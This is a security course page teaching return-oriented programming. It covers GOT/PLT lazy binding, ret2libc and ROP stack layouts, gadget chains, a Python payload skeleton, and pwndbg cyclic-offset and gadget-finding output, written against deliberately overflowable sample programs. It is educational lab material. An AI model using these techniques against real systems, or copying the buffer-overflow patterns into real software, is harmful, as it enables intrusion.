class=td-page-meta--view target=_blank rel=noopener><i class="fa fa-file-alt fa-fw"></i> View page source</a>
<a href=https://github.com/security-summer-school/security-summer-school.github.io/edit/main/content/en/binary/return-oriented-programming/index.md class=td-page-meta--edit target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Edit this page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/new/main/content/en/binary/return-oriented-programming/index.md?filename=change-me.md&value=---%0Atitle%3A+%22Long+Page+Title%22%0AlinkTitle%3A+%22Short+Nav+Title%22%0Aweight%3A+100%0Adescription%3A+%3E-%0A+++++Page+description+for+heading+and+indexes.%0A---%0A%0A%23%23+Heading%0A%0AEdit+this+template+to+create+your+new+page.%0A%0A%2A+Give+it+a+good+name%2C+ending+in+%60.md%60+-+e.g.+%60getting-started.md%60%0A%2A+Edit+the+%22front+matter%22+section+at+the+top+of+the+page+%28weight+controls+how+its+ordered+amongst+other+pages+in+the+same+directory%3B+lowest+number+first%29.%0A%2A+Add+a+good+commit+message+at+the+bottom+of+the+page+%28%3C80+characters%3B+use+the+extended+description+field+for+more+detail%29.%0A%2A+Create+a+new+branch+so+you+can+preview+your+new+file+and+request+a+review+via+Pull+Request.%0A" class=td-page-meta--child target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Create child page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/issues/new?title=" class=td-page-meta--issue target=_blank rel=noopener><i class="fas fa-tasks fa-fw"></i> Create documentation issue</a>
<a href=https://github.com/security-summer-school/issues/new class=td-page-meta--project-issue target=_blank rel=noopener><i class="fas fa-tasks fa-fw"></i> Create project issue</a>
<a id=print href=/binary/_print/><i class="fa fa-print fa-fw"></i> Print entire section</a></div><div class=td-toc><nav id=TableOfContents><ul><li><a href=#table-of-contents>Table of Contents</a></li><li><a href=#prerequisites>Prerequisites</a></li><li><a href=#recap---aslr>Recap - ASLR</a></li><li><a href=#solution---got-and-plt>Solution - GOT and PLT</a><ul><li><a href=#further-inspection>Further Inspection</a></li></ul></li><li><a href=#return-oriented-programming-rop>Return Oriented Programming (ROP)</a><ul><li><a href=#motivation>Motivation</a></li><li><a href=#nop-analogy>NOP Analogy</a></li></ul></li><li><a href=#gadgets-and-rop-chains>Gadgets and ROP Chains</a><ul><li><a href=#code-execution>Code Execution</a></li><li><a href=#changing-register-values>Changing Register Values</a></li><li><a href=#clearing-the-stack>Clearing the Stack</a></li></ul></li><li><a href=#some-useful-tricks>Some Useful Tricks</a><ul><li><a href=#memory-spraying>Memory Spraying</a></li><li><a href=#checksec-in-pwndbg>checksec in pwndbg</a></li><li><a href=#finding-gadgets-in-pwndbg>Finding Gadgets in <code>pwndbg</code></a></li></ul></li><li><a href=#further-reading>Further Reading</a><ul><li><a href=#rop-gadgets-in-pwntools>ROP Gadgets in <code>pwntools</code></a></li><li><a href=#linux-x86-program-start-up>Linux x86 Program Start Up</a></li><li><a href=#the-pltsec-schema>The <code>.plt.sec</code> Schema</a></li></ul></li><li><a href=#putting-it-all-together-demo>Putting it all Together: Demo</a><ul><li><a href=#calling-a-function>Calling a Function</a></li><li><a href=#calling-a-function-with-parameters>Calling a Function with Parameters</a></li><li><a href=#calling-multiple-functions>Calling Multiple Functions</a></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#01-tutorial---bypass-nx-stack-with-return-to-libc>01. Tutorial - Bypass NX Stack with return-to-libc</a></li><li><a href=#02-challenge---ret-to-libc>02. Challenge - ret-to-libc</a></li><li><a href=#03-challenge---no-ret-control>03. Challenge - no-ret-control</a></li><li><a href=#04-challenge---ret-to-plt>04. Challenge - ret-to-plt</a></li><li><a href=#05-challenge---gadget-tutorial>05. Challenge - gadget tutorial</a></li><li><a href=#06-bonus-challenge---echo-service>06. Bonus Challenge - Echo service</a></li></ul></li><li><a href=#conclusions>Conclusions</a></li></ul></nav></div></aside><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><nav aria-label=breadcrumb class=td-breadcrumbs><ol class=breadcrumb><li class=breadcrumb-item><a href=/binary/>Binary Exploitation</a></li><li class="breadcrumb-item active" aria-current=page><a href=/binary/return-oriented-programming/ aria-disabled=true class="btn-link disabled">Return Oriented Programming</a></li></ol></nav><div class=td-content><h1></h1><header class=article-meta></header><h1 id=return-oriented-programming>Return Oriented Programming</h1><h2 id=table-of-contents>Table of Contents</h2><ul><li><a href=#prerequisites>Prerequisites</a></li><li><a href=#recap---aslr>Recap - ASLR</a></li><li><a href=#solution---got-and-plt>Solution - GOT and PLT</a><ul><li><a href=#further-inspection>Further Inspection</a></li></ul></li><li><a href=#return-oriented-programming-rop>Return Oriented Programming (ROP)</a><ul><li><a href=#motivation>Motivation</a></li><li><a href=#nop-analogy>NOP Analogy</a></li></ul></li><li><a href=#gadgets-and-rop-chains>Gadgets and ROP Chains</a><ul><li><a href=#code-execution>Code Execution</a></li><li><a href=#changing-register-values>Changing Register Values</a></li><li><a href=#clearing-the-stack>Clearing the Stack</a></li></ul></li><li><a href=#some-useful-tricks>Some Useful Tricks</a><ul><li><a href=#memory-spraying>Memory Spraying</a></li><li><a href=#checksec-in-pwndbg>checksec in pwndbg</a></li><li><a href=#finding-gadgets-in-pwndbg>Finding Gadgets in pwndbg</a></li></ul></li><li><a href=#further-reading>Further Reading</a><ul><li><a href=#linux-x86-program-start-up>Linux x86 Program Start Up</a></li><li><a href=#the-pltsec-schema>The .plt.sec Schema</a><ul><li><a href=#more-about-cet-and-endbr>More about CET and endbr</a></li><li><a href=#tldr>TLDR</a></li></ul></li></ul></li><li><a href=#putting-it-all-together-demo>Putting it all Together: Demo</a><ul><li><a href=#calling-a-function>Calling a Function</a></li><li><a href=#calling-a-function-with-parameters>Calling a Function with Parameters</a></li><li><a href=#calling-multiple-functions>Calling Multiple Functions</a><ul><li><a href=#finding-gadgets---ropgadget>Finding Gadgets - ROPgadget</a></li></ul></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#01-tutorial---bypass-nx-stack-with-return-to-libc>01. Tutorial - Bypass NX Stack with return-to-libc</a></li><li><a href=#02-challenge---ret-to-libc>02. Challenge - ret-to-libc</a></li><li><a href=#03-challenge---no-ret-control>03. Challenge - no-ret-control</a></li><li><a href=#04-challenge---ret-to-plt>04. Challenge - ret-to-plt</a></li><li><a href=#05-challenge---gadget-tutorial>05. Challenge - gadget tutorial</a></li><li><a href=#06-bonus-challenge---echo-service>06. Bonus Challenge - Echo service</a></li></ul></li><li><a href=#conclusions>Conclusions</a></li></ul><h2 id=prerequisites>Prerequisites</h2><p>In order to fully grasp the content of this session, you should have a good
understanding of the following topics, both theoretically and practically:</p><ul><li>Stack frame</li><li>Shellcodes</li><li>ASLR</li><li>DEP</li><li><code>pwntools</code></li></ul><p>If you are unfamiliar with any of the above concepts or if your understanding of
them is fuzzy, go over their corresponding sessions once again, before you
proceed with the current session.</p><h2 id=recap---aslr>Recap - ASLR</h2><p>ASLR is not the only feature that prevents the compiler and the linker from
solving some relocations before the binary is actually running. Shared libraries
can also be combined in different ways. Thus, the time when the loader is
running is actually the first time you get to know the address of a shared
library. The ASLR feature is orthogonal to this - the loader could choose to
assign the addresses to libraries in a round-robin fashion, or could use ASLR to
assign them randomly.</p><p>Of course, we might be inclined to have the loader simply fix all relocations in
the code section after it loaded the libraries, but this breaks the memory
access protection of the <code>.text</code> section, which should only be <strong>readable</strong> and
<strong>executable</strong>.</p><h2 id=solution---got-and-plt>Solution - GOT and PLT</h2><p>In order to solve this issue, we need another level of indirection. Through this
new level, all accesses to symbols located in shared libraries will read the
actual address from a table at runtime. This table is called the
<strong>Global Offset Table (<code>.got</code>)</strong>. The one who populates this table is the
loader. Note that this can work both for data accesses, as well as for function
calls. However, function calls are actually using a small stub (i.e., a few
instructions) stored in the <strong>Procedure Linkage Table (<code>.plt</code>)</strong>.</p><p>The PLT is responsible of finding the shared library function address when it is
first called (<strong>lazy binding</strong>), and writing it to a GOT entry. Note that the
function pointers are stored in <code>.got.plt</code>). The following calls use the
pre-resolved address.</p><p>Let&rsquo;s take a quick look at the code generated for a shared library call. We&rsquo;ll
be using the binary compiled from the code below, which simply calls <code>puts()</code>.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#000>puts</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Hello world!&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>After compiling this code, let&rsquo;s look at the call to <code>puts()</code>:</p><pre tabindex=0><code>$ objdump -D -j .text -M intel hello | grep puts
80483e4:	e8 07 ff ff ff       	call   80482f0 &lt;puts@plt&gt;
</code></pre><p>If we look at the <code>.plt</code> section, we see that it starts at address <code>0x080482e0</code>,
right where the previous call jumps:</p><pre tabindex=0><code>$ readelf --sections hello
[...]
  [12] .plt              PROGBITS        080482e0 0002e0 000040 04  AX  0   0 16
[...]
</code></pre><p>Now let&rsquo;s see how the code in <code>.plt</code> looks like:</p><pre tabindex=0><code>$ objdump -D -j .plt -M intel hello | grep -A 3 &#39;&lt;puts@plt&gt;&#39;
080482f0 &lt;puts@plt&gt;:
 80482f0:	ff 25 00 a0 04 08    	jmp    DWORD PTR ds:0x804a000
 80482f6:	68 00 00 00 00       	push   0x0
 80482fb:	e9 e0 ff ff ff       	jmp    80482e0 &lt;_init+0x30&gt;
</code></pre><p>We see this code performing a jump to address <code>0x804a000</code> inside the data
section. Let&rsquo;s check the binary relocations for that location:</p><pre tabindex=0><code>$ readelf --relocs hello
[...]
Relocation section &#39;.rel.plt&#39; at offset 0x298 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   puts
[...]
</code></pre><p>Ok, good, but what is actually stored at this address initially?</p><pre tabindex=0><code>$ objdump -s -M intel -j .got.plt --start-address=0x0804a000 hello

hello:     file format elf32-i386
 
Contents of section .got.plt:
 804a000 f6820408 06830408 16830408           ............
</code></pre><p>We recognize <code>f6820408</code> (<code>0x80482f6</code>) as being the next instruction in the
<code>puts@plt</code> stub that we disassembled above. Which then pushes 0 in the stack and
calls 0x80482e0. This is the call to the one-time resolver, and it looks like
this:</p><pre tabindex=0><code>$ objdump -D -j .plt -M intel hello | grep -A 3 &#39;080482e0&#39;

080482e0 &lt;puts@plt-0x10&gt;:
 80482e0:	ff 35 f8 9f 04 08    	push   DWORD PTR ds:0x8049ff8
 80482e6:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 80482ec:	00 00                	add    BYTE PTR [eax],al
</code></pre><p>What&rsquo;s going on here? What&rsquo;s actually happening is lazy binding - by convention
when the dynamic linker loads a library, it will put an identifier and
resolution function into known places in the GOT. Therefore, what happens is
roughly this: on the first call of a function, it falls through to call the
default stub, it simply jumps to the next instruction. The identifier is pushed
on the stack, the dynamic linker is called, which at that point has enough
information to figure out “hey, this program is trying to find the function
foo”. It will go ahead and find it, and then patch the address into the GOT such
that the next time the original PLT entry is called, it will load the actual
address of the function, rather than the lookup stub. Ingenious!</p><h3 id=further-inspection>Further Inspection</h3><p>Going further into the resolver is left as an exercise. You can use GDB to
inspect the address in <code>0x8049ffc</code>, and what happens when this jumps there.</p><h2 id=return-oriented-programming-rop>Return Oriented Programming (ROP)</h2><h3 id=motivation>Motivation</h3><p>In the previous sessions we discussed <code>ret2libc</code> attacks. The standard attack
was to perform an overwrite in the following way:</p><pre tabindex=0><code>RET + 0x00:   addr of system
RET + 0x04:   JUNK
RET + 0x08:   address to desired command (e.g. &#39;/bin/sh&#39;)
</code></pre><p>However, what happens when you need to call multiple functions? Say you need
to call <code>f1()</code> and then <code>f2(0xAB, 0xCD)</code>? The payload should be:</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   JUNK (return address after f2 finishes: we don&#39;t care about what happens after the 2 functions are called)
RET + 0x0c:   0xAB (param1 of f2)
RET + 0x10:   0xCD (param2 of f2)
</code></pre><p>What about if we need to call <code>f1(0xAB, 0xCD)</code> and then <code>f2(0xEF, 0x42)</code>?</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   0xAB (param1 of f1)
RET + 0x0c:   0xCD (param2 of f1) but this should also be 0xEF (param1 of f2)
RET + 0x10:   0x42 (param2 of f2)
</code></pre><h3 id=nop-analogy>NOP Analogy</h3><p>While <code>ret2libc</code> uses functions directly, ROP uses a finer level of code
execution: instruction groups. Let&rsquo;s explore an example:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>a</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>16</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>	<span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>a</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>100</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>This code obviously suffers from a stack buffer overflow. The offset to the
return address is 24. So <code>DOWRD</code>s from offset 24 onwards will be popped from the
stack and executed. Remember the <code>NOP</code> sled concept from previous sessions?
These were long chains of <code>NOP</code> instructions (<code>\x90</code>) used to pad a payload for
alignment purposes. Since we can&rsquo;t add any new code to the program (<em>NX</em> is
enabled) how could we simulate the effect of a <code>NOP</code> sled? Easy! Using return
instructions!</p><p>Let&rsquo;s find the <code>ret</code> instructions in a would-be binary:</p><pre tabindex=0><code>$ objdump  -d hello -M intel | grep $&#39;\t&#39;ret
 80482dd:	c3                   	ret   
 804837a:	c3                   	ret   
 80483b7:	c3                   	ret   
 8048437:	c3                   	ret   
 8048444:	c3                   	ret   
 80484a9:	c3                   	ret   
 80484ad:	c3                   	ret   
 80484c6:	c3                   	ret
</code></pre><p>Any and all of these addresses will be ok. The payload could be the following:</p><pre tabindex=0><code>RET + 0x00:   0x80482dd
RET + 0x04:   0x80482dd
RET + 0x08:   0x80482dd
RET + 0x0c:   0x80482dd
RET + 0x10:   0x80482dd
[...]
</code></pre><p>The above payload will run like so: the original <code>ret</code> (in the normal code flow)
will pop <code>RET+0x00</code> off the stack and jump to it. When <code>RET+0x00</code> gets popped,
the stack is automatically increased by 4 (on to the next value). The
instruction at <code>0x80482dd</code> is another <code>ret</code>, which does the same thing as before.
This goes on until another address that is not a <code>ret</code> is popped off the stack.</p><p>In general, you can use the skeleton below to generate payloads:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#! /usr/bin/python3</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>struct</span><span style=color:#ce5c00;font-weight:700>,</span> <span style=color:#000>sys</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>def</span> <span style=color:#000>dw</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>i</span><span style=color:#000;font-weight:700>):</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#000>struct</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;&lt;I&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>i</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#TODO update count for your prog</span>
</span></span><span style=display:flex><span><span style=color:#000>pad_count_to_ret</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>1</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;X&#34;</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#000>pad_count_to_ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#TODO figure out the rop chain</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>dw</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xcafebeef</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>dw</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xdeadc0de</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>sys</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>stdout</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>write</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>payload</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>decode</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;ascii&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;replace&#39;</span><span style=color:#000;font-weight:700>))</span>
</span></span></code></pre></div><h2 id=gadgets-and-rop-chains>Gadgets and ROP Chains</h2><h3 id=code-execution>Code Execution</h3><p>Now that we&rsquo;ve understood the basics of Return Oriented Programming, let&rsquo;s
actually do something useful. The building blocks of ROP payloads are called
<strong>gadgets</strong>. These are blocks of instructions that end with a <code>ret</code> instruction.
Here are some <em>gadgets</em> from the previous program:</p><pre tabindex=0><code>0x8048443: pop ebp; ret
0x80484a7: pop edi; pop ebp; ret
0x8048441: mov ebp,esp; pop ebp; ret
0x80482da: pop eax; pop ebx; leave; ret
0x80484c3: pop ecx; pop ebx; leave; ret
</code></pre><p>By carefully placing addresses to such gadgets on the stack we can bring code
execution to almost any context we want. As an example, let&rsquo;s say we would like
to load <code>0x41424344</code> into <code>eax</code> and <code>0x61626364</code> into <code>ebx</code>. The payload should
look like this:</p><pre tabindex=0><code>RET + 0x00:   0x80482da  (pop eax; pop ebx; leave; ret)
RET + 0x04:   0x41424344
RET + 0x08:   0x61626364
RET + 0x0c:   0xAABBCCDD (instruction were the gadget&#39;s ret will jump to)
</code></pre><p>Let&rsquo;s see what exactly happens when this payload is given to our binary:</p><ul><li>First the ret addr is popped from the stack and execution goes there.</li><li>At <code>pop eax</code>, <code>0x41424344</code> is loaded into <code>eax</code> and the stack is increased.</li><li>At <code>pop ebx</code>, <code>0x61626364</code> is loaded into <code>ebx</code> and the stack is increased
again.</li><li>At <code>leave</code>, two things actually happen: <code>mov esp, ebp; pop ebp</code>. So the stack
frame is decreased to the previous one (pointed by <code>ebp</code>) and <code>ebp</code> is updated
to the one before that. So <code>esp</code> will now be the old <code>ebp + 4</code>.</li><li>At <code>ret</code>, the code flow will go to the instruction pointed to by <code>ebp+4</code>. This
implies that execution will not go to <code>0xAABBCCDD</code> but to some other address
that may or may not be in our control (depending on how much we can overflow on
the stack). If it is in our control we can overwrite that address with the rest
of the ROP chain.</li></ul><h3 id=changing-register-values>Changing Register Values</h3><p>We have now seen how gadgets can be useful if we want the CPU to achieve a
certain state. This is particularly useful on other architectures such as ARM
and x86_64 where functions do not take parameters from the stack but from
registers. As an example, if we want to call <code>f1(0xAB, 0xCD, 0xEF)</code> on x86_64 we
first need to know the calling convention for the first three parameters (the
convention for placing the rest of the parameters can be found in
<a href=https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions>table here</a>):</p><pre tabindex=0><code>1st param: RDI
2nd param: RSI
3rd param: RDX
</code></pre><p>Now we need to find gadgets for each of these parameters. Let&rsquo;s assume these 2
scenarios: Scenario 1:</p><pre tabindex=0><code>0x400124:  pop rdi; pop rsi; ret
0x400235:  pop rdx; ret
0x400440:  f1()

Payload:
RET + 0x00:   0x400124
RET + 0x08:   val of RDI (0xAB)
RET + 0x10:   val of RSI (0xCD)
RET + 0x18:   0x400235
RET + 0x20:   val of RDX
RET + 0x28:   f1
</code></pre><p>Scenario 2:</p><pre tabindex=0><code>0x400125:  pop rdi; ret
0x400252:  pop rsi; ret
0x400235:  pop rdx; ret
0x400440:  f1()

Payload:
RET + 0x00:   0x400125
RET + 0x08:   val of RDI (0xAB)
RET + 0x10:   0x400252
RET + 0x18:   val of RSI (0xCD)
RET + 0x20:   0x400235 
RET + 0x28:   val of RDX
RET + 0x30:   f1
</code></pre><p>Notice that because the architecture is 64 bits wide, the values on the stack
are not dwords but qwords (quad words: 8 bytes wide). Thus, the offsets between
the values in the payload are 8, instead of 4 (as they would be on a 32-bit
architecture).</p><h3 id=clearing-the-stack>Clearing the Stack</h3><p>The second use of gadgets is to clear the stack. Remember the issue we had in
the <a href=#motivation>Motivation</a> section? Let&rsquo;s solve it using gadgets. We need to call
<code>f1(0xAB, 0xCD)</code> and then <code>f2(0xEF, 0x42)</code>. Our initial solution was:</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)  but this should also be 0xEF (param1 of f2)
RET + 0x10:   0x42 (param2 of f2) 
</code></pre><p>Note that now, for the sake of clarity, we&rsquo;re moving back to <code>x32</code>, so that
parameters are again passed on the stack.</p><p>The problem is that those parameters of <code>f1</code> are getting in the way of calling
<code>f2</code>. We need to find a <code>pop pop ret</code> gadget. The actual registers are not
important, as we only need to clear 2 values from the stack.</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of (pop eax, pop ebx, ret) 
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)
RET + 0x10:   addr of f2
RET + 0x14:   JUNK
RET + 0x18:   0xEF (param1 of f2)
RET + 0x1c:   0x42 (param2 of f2) 
</code></pre><p>Now we can even call the next function <code>f3</code> if we repeat the trick:</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of (pop eax, pop ebx, ret) 
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)
RET + 0x10:   addr of f2
RET + 0x14:   addr of (pop eax, pop ebx, ret) 
RET + 0x18:   0xEF (param1 of f2)
RET + 0x1c:   0x42 (param2 of f2) 
RET + 0x20:   addr of f3
</code></pre><h2 id=some-useful-tricks>Some Useful Tricks</h2><h3 id=memory-spraying>Memory Spraying</h3><p>Let&rsquo;s take the following program:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>x</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>y</span> <span style=color:#000;font-weight:700>,</span><span style=color:#000>z</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>a</span><span style=color:#000;font-weight:700>,</span><span style=color:#000>b</span><span style=color:#000;font-weight:700>,</span><span style=color:#000>c</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>23</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>        <span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>100</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>It&rsquo;s a fairly simple overflow, but just how fast can you figure out the offset
to the return address? How much padding do you need? There is a shortcut that
you can use to figure this out in under 30 seconds without looking at the
<em>Assembly</em> code.</p><p>A <a href=https://en.wikipedia.org/wiki/De_Bruijn_sequence>De Bruijn sequence</a> is a
string of symbols out of a given alphabet in which each consecutive K symbols
only appear once in the whole string. If we can construct such a string out of
printable characters then we only need to know the Segmentation Fault address.
Converting it back to 4 bytes and searching for it in the initial string will
give us the exact offset to the return address.</p><p><a href>pwndbg</a> can help you do this, using the
<a href=https://docs.pwntools.com/en/stable/util/cyclic.html>cyclic</a> package from the
<code>pwnlib</code> library:</p><pre tabindex=0><code>pwndbg&gt; cyclic 100  # create a 100-character long De Bruijn sequence
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

pwndbg&gt; cyclic -l aaa  # as addresses are 4 or 8  bytes long, you cannot search for a shorter pattern
[CRITICAL] Subpattern must be 4 bytes

pwndbg&gt; cyclic -l faaa  # the offset of faaa in the above cyclic pattern is 20
20
</code></pre><pre tabindex=0><code>pwndbg&gt; cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg&gt; run
Starting program: /media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x080491d1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0x61616172 (&#39;raaa&#39;)
 EDX  0xfbad2288
 EDI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616173 (&#39;saaa&#39;)
 ESP  0x61616178 (&#39;uaaa&#39;)
 EIP  0x61616174 (&#39;taaa&#39;)    
──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
Invalid address 0x61616174
[...]
pwndbg&gt; cyclic -l 0x61616174
76
</code></pre><p>From the above commands we can deduce that EIP&rsquo;s offset relative to the start of
the buffer is 76, as the address that EIP points to is <code>0x61616174</code>, i.e.
<code>'taaa'</code>, which lies at offset 76 in the cyclic pattern we&rsquo;ve just generated.</p><h3 id=checksec-in-pwndbg>checksec in pwndbg</h3><pre tabindex=0><code>pwndbg&gt; checksec
[*] &#39;/media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><h3 id=finding-gadgets-in-pwndbg>Finding Gadgets in <code>pwndbg</code></h3><pre tabindex=0><code>pwndbg&gt; rop
Gadgets information
============================================================
0x080490fa : adc al, 0x68 ; sbb al, 0xc0 ; add al, 8 ; call eax
0x08049146 : adc byte ptr [eax + 0x68], dl ; sbb al, 0xc0 ; add al, 8 ; call edx
0x08049104 : adc cl, cl ; ret
0x0804909b : adc dword ptr [eax - 0x2e], -1 ; call dword ptr [eax - 0x73]
0x0804917c : add al, 8 ; add ecx, ecx ; ret
0x080490fe : add al, 8 ; call eax
0x0804914b : add al, 8 ; call edx
0x0804918c : add byte ptr [eax], al ; add byte ptr [eax], al ; endbr32 ; jmp 0x8049120
[...]

